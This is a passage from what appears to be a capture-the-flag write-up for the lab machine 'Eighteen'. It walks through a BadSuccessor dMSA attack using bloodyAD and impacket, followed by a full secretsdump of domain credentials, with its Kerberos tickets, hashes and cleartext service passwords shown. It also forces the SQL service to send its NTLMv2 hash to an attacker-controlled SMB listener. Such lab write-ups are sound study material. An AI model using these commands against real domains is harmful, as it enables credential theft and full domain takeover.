      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

  ServiceName              :  cifs/DC01.eighteen.htb
  ServiceRealm             :  EIGHTEEN.HTB
  UserName                 :  attacker$ (NT_PRINCIPAL)
  UserRealm                :  eighteen.htb
  StartTime                :  11/18/2025 1:53:46 PM
  EndTime                  :  11/18/2025 2:08:23 PM
  RenewTill                :  11/25/2025 1:52:54 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  iTxBXu6yqdfJkejvfzyTB4m2vvtyhyeeLiMcTYbC6vo=


PS C:\Users\adam.scott\Documents> dir \\DC01\c$
dir \\DC01\c$


    Directory: \\DC01\c$


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/11/2025  10:50 AM                inetpub                                                              
d-----          4/1/2024  12:01 AM                PerfLogs                                                             
d-r---        11/10/2025  12:16 PM                Program Files                                                        
d-r---        11/10/2025  12:16 PM                Program Files (x86)                                                  
d-----         9/12/2025   1:22 AM                SQL2022                                                              
d-r---        10/27/2025   6:06 PM                Users                                                                
d-----        11/10/2025   5:06 PM                Windows                                                              

PS C:\Users\adam.scott\Documents> type \\DC01\c$\Users\Administrator\Desktop\root.txt
af501744<SNIP>
```

## Linux Method

We can perform this attack from Linux, we do not have to run anything on the windows host. The only requirement is to have the port forwarding done beforehand. BloodyAD introduced the add `BadSuccessor` module which performs the steps for adding a weaponized dMSA for us. We can then request a service ticket which we can use to dump the NTLM database, giving us the administrator's NTLM hash.

The current bloodyAD module to add the dMSA gave me an error, but there is already a fix for it. If it has not been fixed by the time this post is available, the solution is described [here](https://github.com/CravateRouge/bloodyAD/issues/101). Also, this module is quite new, so I had to create a python environment to install the most recent bloodyAD version, as the one provided by kali does not include it.

```
python3 bloodyAD.py -d eighteen.htb --host 240.0.0.1 -u adam.scott -p iloveyou1 add badSuccessor attacker
[+] Creating DMSA attacker$ in OU=Staff,DC=eighteen,DC=htb
[+] Impersonating: CN=Administrator,CN=Users,DC=eighteen,DC=htb
Clock skew detected. Adjusting local time by 7:00:01.612092. Retrying operation.
[+] 
Realm        : EIGHTEEN.HTB
Sname        : krbtgt/EIGHTEEN.HTB
UserName     : attacker$
UserRealm    : eighteen.htb
StartTime    : 2025-11-19 19:28:33+00:00
EndTime      : 2025-11-20 05:28:33+00:00
RenewTill    : 2025-11-20 19:28:33+00:00
Flags        : renewable, forwardable, enc-pa-rep, pre-authent
Keytype      : 18
Key          : xq/EbEkFUsflSn7Ox1yJNYG3rWFVbsmMSVz12l3wYsM=
EncodedKirbi : 

    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
    Ti5IVEI=
[+] dMSA TGT stored in ccache file attacker_JF.ccache
[+] 
dMSA current keys found in TGS:
[+] AES256: e3ac7432c282bc5102a2f4e4c668b43722556f4d145919d3faece867b2ea5f2f
[+] AES128: 3c693722630ecb7606d6fdd8d2370b9b
[+] RC4: 83a479d45b3889a4260a92d58df50d94
[+] 
dMSA previous keys found in TGS (including keys of preceding managed accounts):
[+] RC4: 0b133be956bfaddf9cea56701affddec
```

We can see that it created the account and we get the ccache file that we can use to request the service ticket.
```
export KRB5CCNAME=attacker_JF.ccache
faketime -f '+7h' impacket-getST -dc-ip 240.0.0.1 -spn 'cifs/DC01.eighteen.htb' 'eighteen.htb/attacker$' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in attacker$@cifs_DC01.eighteen.htb@EIGHTEEN.HTB.ccache
```

With this ticket we can perform a secretsdump, but first I changed my `/etc/hosts` file because I was getting DNS resolution errors and timeouts. This fixed it.
```
cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali.home	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


240.0.0.1 DC01.eighteen.htb eighteen.htb DC01
```

We can then perform the secret dump with impacket.
```
export KRB5CCNAME=attacker\$@cifs_DC01.eighteen.htb@EIGHTEEN.HTB.ccache

faketime -f '+7h' impacket-secretsdump  -no-pass 'attacker$'@'DC01.eighteen.htb' -k   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x8a6c03715ce8a8d26720e83ffe01c780
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
EIGHTEEN\DC01$:plain_password_hex:4300770067007000580054005000520033004b005a0038004f00570069006200570074007900350032006f0048003300310054002b0031007a0070006b004b0039006d0037005400620052006b0074004800550051005200550063007200610074005600330072003500720057005a00580068005300360051006800770066004500360031006a0062006a00320063004b004c00320034007100520044003100740046007200320059002b0037004f0058002b0041004100370070004d003d0076006a006d006e004e007a00360042005200690067006400740037004d00350070006e0061006f00350079004300590038006a004c0068004c0069005500700047006d006a00470059006d00410068003800530049004e0046004d0072006b00670053006200790075007a003300620054006700660073004b006a00760048003900720030003300590046003200590035006c005a004d007900380076004b0079003500340037004200770058004c0067006f0054002b006e0065007300510037004a00700074003d003100410038005900750042007600490045007100640061006400760077004d0043006a00330047005700730043004d0038007a004f00730070004f006b004b0079004200690070004500360058006700760050005700480054004d004a00470073007200690056004f0065004e00420038004c006200
EIGHTEEN\DC01$:aad3b435b51404eeaad3b435b51404ee:d79b6837ac78c51c79aab3d970875584:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x48249fb0f4cf23ecbef54affc2b21d65717bf7df
dpapi_userkey:0xb8820f0412fc851cca8aa426248e7f37af5dd0b2
[*] NL$KM 
 0000   FA 36 C7 D5 C0 82 AB B5  78 E1 17 F0 5E 36 13 5B   .6......x...^6.[
 0010   A5 9F C0 9C 38 A8 C4 34  FE 20 F7 2B D9 A2 8C AF   ....8..4. .+....
 0020   71 F2 E0 D2 09 A1 EC 09  EB DE 9B 8C F5 4A E6 2D   q............J.-
 0030   6B 1D 32 16 A2 ED B4 AE  F1 51 AE 5B 41 E5 4E B6   k.2......Q.[A.N.
NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
[*] _SC_MSSQLSERVER 
EIGHTEEN\mssqlsvc:zOq3u4AKw5]e
[*] _SC_SQLSERVERAGENT 
EIGHTEEN\mssqlsvc:!JpC319216bama
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
!!Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::!!
<SNIP>
```

We can verify the credentials with netexec.
```
netexec smb DC01 -u Administrator -H 0b133be956bfaddf9cea56701affddec
SMB         240.0.0.1       445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:eighteen.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         240.0.0.1       445    DC01             !![+] eighteen.htb\Administrator:0b133be956bfaddf9cea56701affddec (Pwn3d!)!!
```

## Beyond Root

Surprisingly, dirtree is enabled on the database which lets us steal the NTLMv2 hash of the mssqlservice account, this does not lead to anything as the hash cannot be cracked but I found it interesting. To do so I used responder to capture the request.

```
sudo responder -I tun0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]

<SNIP>

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.93]
    Responder IPv6             [dead:beef:2::105b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-XK8J6QCCARX]
    Responder Domain Name      [SEZQ.LOCAL]
    Responder DCE-RPC Port     [45884]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

I then entered my IP and a fake smb share so that the poisoner could receive the hash. 
```
SQL (kevin  guest@master)> xp_dirtree \\10.10.14.93\doesnotexit
subdirectory   depth   file   
------------   -----   ---- 
```

Back on the responder interface we can see that the NTLMv2 hash was captured, as I said, I could not crack the hash but I still felt like showing this possible attack.
```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.166.174
[SMB] NTLMv2-SSP Username : EIGHTEEN\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::EIGHTEEN:cf75a693eba003c0:BA2650E72970670C03B526BFD47B0FB0:0101000000000000007402E14E58DC01C82134913C3AC9BD0000000002000800530045005A00510001001E00570049004E002D0058004B0038004A00360051004300430041005200580004003400570049004E002D0058004B0038004A0036005100430043004100520058002E00530045005A0051002E004C004F00430041004C0003001400530045005A0051002E004C004F00430041004C0005001400530045005A0051002E004C004F00430041004C0007000800007402E14E58DC01060004000200000008003000300000000000000000000000003000000048C6194A7A9E32BA58CD99A207705A123F229C3506FA52FF644A1DC4F75D690A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390033000000000000000000
```


Although it was an easy box I learned a lot, and probably yapped a lot too. I think this might be my longest post. 